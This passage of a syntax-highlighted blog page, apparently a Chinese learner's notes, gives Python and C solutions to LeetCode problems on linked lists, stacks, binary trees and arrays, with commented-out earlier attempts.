python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"># class ListNode(object):</span></span><br><span class="line"><span class="comment">#     def __init__(self, val=0, next=None):</span></span><br><span class="line"><span class="comment">#         self.val = val</span></span><br><span class="line"><span class="comment">#         self.next = next</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">sortList</span><span class="params">(self, head)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type head: ListNode</span></span><br><span class="line"><span class="string">        :rtype: ListNode</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="comment"># h_head = ListNode(None)</span></span><br><span class="line">        <span class="comment"># print(h_head)</span></span><br><span class="line">        <span class="comment"># res = []</span></span><br><span class="line">        <span class="comment"># while head != None:</span></span><br><span class="line">        <span class="comment">#    res.append(head)</span></span><br><span class="line">        <span class="comment">#    head = head.next</span></span><br><span class="line">        <span class="comment"># print(res) </span></span><br><span class="line">        <span class="comment"># res = sorted(res,key = lambda x:x.val)</span></span><br><span class="line">        <span class="comment"># print(res)</span></span><br><span class="line">        <span class="comment"># n = len(res)</span></span><br><span class="line">        <span class="comment"># h_head.next = res[0]</span></span><br><span class="line">        <span class="comment"># # res[0].next = res[1]</span></span><br><span class="line">        <span class="comment"># return h_head.next</span></span><br><span class="line">        <span class="comment"># for i in range(n-1):</span></span><br><span class="line">        <span class="comment">#     res[i].next = res[i+1]</span></span><br><span class="line">        <span class="comment"># return h_head.next</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        h_head = ListNode(<span class="literal">None</span>) <span class="comment">#申请头节点</span></span><br><span class="line">        res = [] <span class="comment">#将节点保存在列表中</span></span><br><span class="line">        <span class="keyword">while</span> head <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            next_h = head.next</span><br><span class="line">            head.next = <span class="literal">None</span></span><br><span class="line">            res.append(head)</span><br><span class="line">            head = next_h</span><br><span class="line">            <span class="comment"># head = head.next</span></span><br><span class="line">        res = sorted(res,key = <span class="keyword">lambda</span> x:x.val)</span><br><span class="line">        <span class="comment"># print(res)</span></span><br><span class="line">        n = len(res)</span><br><span class="line">        <span class="keyword">if</span> n == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        h_head.next = res[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(n<span class="number">-1</span>):</span><br><span class="line">            res[i].next = res[i+<span class="number">1</span>]</span><br><span class="line">        <span class="comment"># print(res)</span></span><br><span class="line">        <span class="keyword">return</span> h_head.next</span><br></pre></td></tr></table></figure><h4 id="最小栈-easy"><a href="#最小栈-easy" class="headerlink" title="最小栈(easy)"></a>最小栈(easy)</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MinStack</span><span class="params">(object)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        initialize your data structure here.</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        self.l = [] <span class="comment">#列表操作</span></span><br><span class="line">        self.index = <span class="number">-1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">push</span><span class="params">(self, x)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type x: int</span></span><br><span class="line"><span class="string">        :rtype: None</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="comment"># self.l.append(x)</span></span><br><span class="line">        <span class="comment"># self.minnum = min(self.l)</span></span><br><span class="line"></span><br><span class="line">        self.l.append(x)</span><br><span class="line">        self.index+=<span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">pop</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :rtype: None</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        self.l.pop()</span><br><span class="line">        <span class="comment"># self.minnum =not self.l or min(self.l)</span></span><br><span class="line">        self.index-=<span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">top</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :rtype: int</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="keyword">return</span> self.l[<span class="number">-1</span>]</span><br><span class="line">        <span class="comment"># return self.l[self.index]</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">getMin</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :rtype: int</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="comment"># return self.minnum</span></span><br><span class="line">        <span class="keyword">return</span> min(self.l)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Your MinStack object will be instantiated and called as such:</span></span><br><span class="line"><span class="comment"># obj = MinStack()</span></span><br><span class="line"><span class="comment"># obj.push(x)</span></span><br><span class="line"><span class="comment"># obj.pop()</span></span><br><span class="line"><span class="comment"># param_3 = obj.top()</span></span><br><span class="line"><span class="comment"># param_4 = obj.getMin()</span></span><br></pre></td></tr></table></figure><h4 id="相交链表-easy"><a href="#相交链表-easy" class="headerlink" title="相交链表(easy)"></a>相交链表(easy)</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"># class ListNode(object):</span></span><br><span class="line"><span class="comment">#     def __init__(self, x):</span></span><br><span class="line"><span class="comment">#         self.val = x</span></span><br><span class="line"><span class="comment">#         self.next = None</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">getIntersectionNode</span><span class="params">(self, headA, headB)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type head1, head1: ListNode</span></span><br><span class="line"><span class="string">        :rtype: ListNode</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        l1=<span class="number">0</span></span><br><span class="line">        l2=<span class="number">0</span></span><br><span class="line">        node1=headA</span><br><span class="line">        node2=headB</span><br><span class="line">        <span class="keyword">while</span> headA: <span class="comment">#求第一个链表长度</span></span><br><span class="line">            l1+=<span class="number">1</span></span><br><span class="line">            headA=headA.next</span><br><span class="line">        <span class="keyword">while</span> headB: <span class="comment">#求第二个链表长度</span></span><br><span class="line">            l2+=<span class="number">1</span></span><br><span class="line">            headB=headB.next</span><br><span class="line">        s=l1-l2</span><br><span class="line">        <span class="keyword">while</span> s&gt;<span class="number">0</span>: <span class="comment">#对齐两个链表长度</span></span><br><span class="line">            node1=node1.next</span><br><span class="line">            s-=<span class="number">1</span></span><br><span class="line">        <span class="keyword">while</span> s&lt;<span class="number">0</span>:</span><br><span class="line">            node2=node2.next</span><br><span class="line">            s+=<span class="number">1</span></span><br><span class="line">        <span class="keyword">while</span> node1 <span class="keyword">and</span> node2:</span><br><span class="line">            <span class="keyword">if</span> node1==node2:</span><br><span class="line">                <span class="keyword">return</span> node1</span><br><span class="line">            node1=node1.next</span><br><span class="line">            node2=node2.next</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        <span class="comment"># while node1!=node2: #从头开始判断地址是否相同</span></span><br><span class="line">        <span class="comment">#     node1=node1.next</span></span><br><span class="line">        <span class="comment">#     node2=node2.next</span></span><br><span class="line">        <span class="comment"># return node1</span></span><br></pre></td></tr></table></figure><h4 id="多数元素-easy"><a href="#多数元素-easy" class="headerlink" title="多数元素(easy)"></a>多数元素(easy)</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">majorityElement</span><span class="params">(self, nums)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type nums: List[int]</span></span><br><span class="line"><span class="string">        :rtype: int</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        res = sorted(nums)</span><br><span class="line">        <span class="keyword">return</span> res[(len(nums)//<span class="number">2</span>)]</span><br></pre></td></tr></table></figure><h4 id="反转链表-easy"><a href="#反转链表-easy" class="headerlink" title="反转链表(easy)"></a>反转链表(easy)</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"># class ListNode(object):</span></span><br><span class="line"><span class="comment">#     def __init__(self, x):</span></span><br><span class="line"><span class="comment">#         self.val = x</span></span><br><span class="line"><span class="comment">#         self.next = None</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">reverseList</span><span class="params">(self, head)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type head: ListNode</span></span><br><span class="line"><span class="string">        :rtype: ListNode</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="comment"># if head:</span></span><br><span class="line">        <span class="comment">#     pre=head</span></span><br><span class="line">        <span class="comment">#     q=head.next</span></span><br><span class="line">        <span class="comment">#     while pre.next:</span></span><br><span class="line">        <span class="comment">#         pre.next=q.next</span></span><br><span class="line">        <span class="comment">#         q.next=head</span></span><br><span class="line">        <span class="comment">#         head=q</span></span><br><span class="line">        <span class="comment">#         q=pre.next</span></span><br><span class="line">        <span class="comment"># return head</span></span><br><span class="line">        <span class="keyword">if</span> head==<span class="literal">None</span> <span class="keyword">or</span> head.next==<span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> head</span><br><span class="line">        pre=head</span><br><span class="line">        q=head.next</span><br><span class="line">        <span class="keyword">while</span> pre.next:</span><br><span class="line">            pre.next=q.next</span><br><span class="line">            q.next=head</span><br><span class="line">            head=q</span><br><span class="line">            q=pre.next</span><br><span class="line">        <span class="keyword">return</span> head</span><br></pre></td></tr></table></figure><h4 id="数组中的第K个最大元素-medium"><a href="#数组中的第K个最大元素-medium" class="headerlink" title="数组中的第K个最大元素(medium)"></a>数组中的第K个最大元素(medium)</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">findKthLargest</span><span class="params">(self, nums, k)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type nums: List[int]</span></span><br><span class="line"><span class="string">        :type k: int</span></span><br><span class="line"><span class="string">        :rtype: int</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        s = sorted(nums,reverse=<span class="literal">True</span>)</span><br><span class="line">        <span class="keyword">return</span> s[k<span class="number">-1</span>]</span><br></pre></td></tr></table></figure><h4 id="存在重复元素-easy"><a href="#存在重复元素-easy" class="headerlink" title="存在重复元素(easy)"></a>存在重复元素(easy)</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">containsDuplicate</span><span class="params">(self, nums)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type nums: List[int]</span></span><br><span class="line"><span class="string">        :rtype: bool</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        d = dict(Counter(nums))</span><br><span class="line">        <span class="keyword">for</span> v <span class="keyword">in</span> d.values():</span><br><span class="line">            <span class="keyword">if</span> v&gt;=<span class="number">2</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure><h4 id="二叉搜索树中第K小的元素-medium"><a href="#二叉搜索树中第K小的元素-medium" class="headerlink" title="二叉搜索树中第K小的元素(medium)"></a>二叉搜索树中第K小的元素(medium)</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"># class TreeNode(object):</span></span><br><span class="line"><span class="comment">#     def __init__(self, val=0, left=None, right=None):</span></span><br><span class="line"><span class="comment">#         self.val = val</span></span><br><span class="line"><span class="comment">#         self.left = left</span></span><br><span class="line"><span class="comment">#         self.right = right</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">kthSmallest</span><span class="params">(self, root, k)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type root: TreeNode</span></span><br><span class="line"><span class="string">        :type k: int</span></span><br><span class="line"><span class="string">        :rtype: int</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        res = []</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">pre</span><span class="params">(node)</span>:</span></span><br><span class="line">            <span class="keyword">if</span> node == <span class="literal">None</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">            pre(node.left)</span><br><span class="line">            res.append(node.val)</span><br><span class="line">            pre(node.right)</span><br><span class="line">        pre(root)</span><br><span class="line">        <span class="keyword">return</span> res[k<span class="number">-1</span>]</span><br><span class="line">        <span class="comment"># print(res)</span></span><br></pre></td></tr></table></figure><h4 id="2的幂-easy"><a href="#2的幂-easy" class="headerlink" title="2的幂(easy)"></a>2的幂(easy)</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">bool isPowerOfTwo(int n) &#123;</span><br><span class="line">    <span class="keyword">if</span>(n&lt;=<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> false;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">if</span>((n&amp;n<span class="number">-1</span>)==<span class="number">0</span>)</span><br><span class="line">            <span class="keyword">return</span> true;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">return</span> false;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="二叉搜索树的最近公共祖先-easy"><a href="#二叉搜索树的最近公共祖先-easy" class="headerlink" title="二叉搜索树的最近公共祖先(easy)"></a>二叉搜索树的最近公共祖先(easy)</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"># class TreeNode(object):</span></span><br><span class="line"><span class="comment">#     def __init__(self, x):</span></span><br><span class="line"><span class="comment">#         self.val = x</span></span><br><span class="line"><span class="comment">#         self.left = None</span></span><br><span class="line"><span class="comment">#         self.right = None</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">lowestCommonAncestor</span><span class="params">(self, root, p, q)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type root: TreeNode</span></span><br><span class="line"><span class="string">        :type p: TreeNode</span></span><br><span class="line"><span class="string">        :type q: TreeNode</span></span><br><span class="line"><span class="string">        :rtype: TreeNode</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="keyword">if</span> root==<span class="literal">None</span> <span class="keyword">or</span> root==p <span class="keyword">or</span> root==q:</span><br><span class="line">            <span class="keyword">return</span> root</span><br><span class="line">        left = self.lowestCommonAncestor(root.left,p,q)</span><br><span class="line">        right= self.lowestCommonAncestor(root.right,p,q)</span><br><span class="line">        <span class="keyword">if</span> left!=<span class="literal">None</span> <span class="keyword">and</span> right!=<span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> root</span><br><span class="line">        <span class="keyword">if</span> left!=<span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> left</span><br><span class="line">        <span class="keyword">if</span> right!=<span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> right</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br></pre></td></tr></table></figure><h4 id="二叉树的最近公共祖先-medium"><a href="#二叉树的最近公共祖先-medium" class="headerlink" title="二叉树的最近公共祖先(medium)"></a>二叉树的最近公共祖先(medium)</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"># class TreeNode(object):</span></span><br><span class="line"><span class="comment">#     def __init__(self, x):</span></span><br><span class="line"><span class="comment">#         self.val = x</span></span><br><span class="line"><span class="comment">#         self.left = None</span></span><br><span class="line"><span class="comment">#         self.right = None</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">lowestCommonAncestor</span><span class="params">(self, root, p, q)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type root: TreeNode</span></span><br><span class="line"><span class="string">        :type p: TreeNode</span></span><br><span class="line"><span class="string">        :type q: TreeNode</span></span><br><span class="line"><span class="string">        :rtype: TreeNode</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="comment">#如果root不存在或者有一个值是根节点，直接返回根节点即可</span></span><br><span class="line">        <span class="keyword">if</span> root == <span class="literal">None</span> <span class="keyword">or</span> root==p <span class="keyword">or</span> root==q:</span><br><span class="line">            <span class="keyword">return</span> root</span><br><span class="line">        <span class="comment">#递归左右子树查找</span></span><br><span class="line">        left = self.lowestCommonAncestor(root.left,p,q)</span><br><span class="line">        right = self.lowestCommonAncestor(root.right,p,q)</span><br><span class="line">        <span class="keyword">if</span> left!=<span class="literal">None</span> <span class="keyword">and</span> right != <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> root</span><br><span class="line">        <span class="keyword">elif</span> left!=<span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> left</span><br><span class="line">        <span class="keyword">elif</span> right!=<span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> right</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br></pre></td></tr></table></figure><h4 id="删除链表中的节点-easy"><a href="#删除链表中的节点-easy" class="headerlink" title="删除链表中的节点(easy)"></a>删除链表中的节点(easy)</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"># class ListNode(object):</span></span><br><span class="line"><span class="comment">#     def __init__(self, x):</span></span><br><span class="line"><span class="comment">#         self.val = x</span></span><br><span class="line"><span class="comment">#         self.next = None</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">deleteNode</span><span class="params">(self, node)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type node: ListNode</span></span><br><span class="line"><span class="string">        :rtype: void Do not return anything, modify node in-place instead.</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        node.val=node.next.val</span><br><span class="line">        node.next=node.next.next</span><br></pre></td></tr></table></figure><h4 id="除自身以外数组的乘积-medium"><a href="#除自身以外数组的乘积-medium" class="headerlink" title="除自身以外数组的乘积(medium)"></a>除自身以外数组的乘积(medium)</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">productExceptSelf</span><span class="params">(self, nums)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type nums: List[int]</span></span><br><span class="line"><span class="string">        :rtype: List[int]</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        res=[]</span><br><span class="line">        res1=[<span class="number">1</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(len(nums))]</span><br><span class="line">        res2 = [<span class="number">1</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(len(nums))]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,len(nums)):</span><br><span class="line">            res1[i]=nums[i<span class="number">-1</span>]*res1[i<span class="number">-1</span>]</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(len(nums)<span class="number">-2</span>,<span class="number">-1</span>,<span class="number">-1</span>):</span><br><span class="line">            res2[j]=nums[j+<span class="number">1</span>]*res2[j+<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(res1)):</span><br><span class="line">            res.append(res1[i]*res2[i])</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line">        <span class="comment"># print(res)</span></span><br><span class="line">        <span class="comment"># for i in range(len(nums)):</span></span><br><span class="line">        <span class="comment">#     for j in range(i):</span></span><br><span class="line">        <span class="comment">#         res[i]*=nums[j]</span></span><br><span class="line">        <span class="comment">#     for k in range(i+1,len(nums)):</span></span><br><span class="line">        <span class="comment">#         res[i]*=nums[k]</span></span><br><span class="line">        <span class="comment"># return res</span></span><br></pre></td></tr></table></figure><h4 id="Nim游戏-easy"><a href="#Nim游戏-easy" class="headerlink" title="Nim游戏(easy)"></a>Nim游戏(easy)</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 